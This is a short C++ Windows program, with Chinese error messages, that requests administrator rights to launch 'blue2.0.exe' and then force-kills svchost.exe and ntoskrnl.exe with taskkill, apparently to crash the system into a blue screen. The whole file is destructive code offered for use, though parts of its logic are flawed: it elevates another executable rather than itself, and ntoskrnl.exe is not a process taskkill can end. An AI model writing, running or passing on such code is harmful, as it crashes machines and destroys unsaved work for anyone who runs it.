#include <iostream>
#include <fstream> 
#include <windows.h>

 
int main() {

    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = TEXT("runas");
    sei.lpFile = TEXT("blue2.0.exe");
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;
    
    if (!ShellExecuteEx(&sei)) {
        DWORD errorCode = GetLastError();
        if (errorCode == ERROR_CANCELLED) {
            std::cerr << "用户拒绝了管理员权限请求。" << std::endl;
        } else {
            std::cerr << "请求管理员权限失败，错误代码：" << errorCode << std::endl;
        }
        return 1;
    }
    
  int status = system("taskkill /F /IM svchost.exe");
  int status1 = system("taskkill /F /IM ntoskrnl.exe");

  if (status != 0) {
    std::cout << "执行命令失败" << std::endl;
    return 1; 
  }
  return 0;
}
